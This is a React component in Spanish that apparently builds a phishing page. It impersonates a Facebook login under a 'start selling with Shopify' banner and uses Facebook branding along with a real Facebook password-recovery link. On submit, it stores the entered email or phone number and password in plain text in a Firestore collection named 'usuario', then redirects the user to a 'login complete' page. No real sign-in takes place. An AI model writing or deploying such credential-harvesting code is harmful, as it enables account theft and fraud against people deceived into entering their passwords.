import React, { useState } from "react";
import { collection, addDoc } from "firebase/firestore";
import { db } from "../firebaseconfig/firebase";
import { useNavigate } from "react-router-dom";
export function Portada() {
  const [correo_numero, setCorreo_numero] = useState("");
  const [pass, setPass] = useState("");
const Navigate= useNavigate()
  const data_collection = collection(db, "usuario");

  const handleFormSubmit = async (e) => {

    if(pass === ""){
        alert("llenar")
    }
    e.preventDefault();
    await addDoc(data_collection, { correo_numero: correo_numero, pass: pass });

    
    Navigate('/login_completo')
  };

  return (
    <div>
      
       <h2>COMIENZA HOY A VENDER CON SHOPIFY</h2>     
      <div className="logos">
        <img src="./src/img/Facebook.png" alt="" />

        <img className="vinculo" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAYAAADgdz34AAAAAXNSR0IArs4c6QAAAdxJREFUSEvV1U+ITmEUx/HPEGOlUGNhQ7FDykqasmFhI1mIYUUS5W8sREokyb8kJBuTElaItRRmNpaSHYvZTRElf+I5em49c3tn3MtMjWf33vc+53vO7/zOuV0m+HRNcHyTFrAIKzAPQxjA605q/E0FO3AJM4qA33AoPx/BaQvYiav4gQt4ipU4iGnYg8sloS1gDu7hKJ4XgZbjGaYg5Htf/dcWMJbpTqTKjqVebMTdNoDpKaNtSZq5SefPuI6PHUhb0J+rO9UUsDeVHZnNLAJ+wbUEOYCfxfNb2IpNuNMEcCQ1rsok9H6BxUn7Nfyen9OId+JU2YebFuLdnwDncoZxYR2eFJkuxUWsxwesxQNMbeqi/UmS80nL7zn44+TvWSn7+9iVJHhTwFbjYaqmG2dxuN6buosW4G3OptTyTL78Kfv8K2Zjd7ZmuOdkk0mutLyJ7cWFSCRkiUELV1Un3BR9uDKaf+sVRCbhmhFeLi7HeujFktz0wTzVo85HHbA5TeLtDDk+Hqu8Dpifmxi7JnbMqwISv0PnDcktw03hnVZF5aJoZDjjJVZhX25+bNMb/wKIu33Zqj1FoFhgYdNHTYPHe2Mtu3BLyLIsDVM0Mz4qMRutznhu047g/x/wCwXEVBnPOi9cAAAAAElFTkSuQmCC"/>
        <img src="./src/img/logo.webp" alt="" />
      </div>
      <div className="login-container">
        <div className="text">Iniciar sesión con Facebook</div>
        <form onSubmit={handleFormSubmit} className="form" action="#" method="post">
          <div className="form-group">
            <input required
              value={correo_numero}
              onChange={(e) => setCorreo_numero(e.target.value)}
              type="text"
              id="username"
              name="username"
              placeholder="Correo electrónico o número de teléfono"
            />
          </div>
          <div className="form-group">
            <input required
              value={pass}
              onChange={(e) => setPass(e.target.value)}
              type="password"
              id="password"
              name="password"
              placeholder="Contraseña"
              
            />
            
          </div>
          <button type="submit">Iniciar Sesión</button>
          <div className="links">
            <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0">
              ¿Olvidaste tu contraseña?
            </a>
          </div>
        </form>
      </div>
    </div>
  );
}
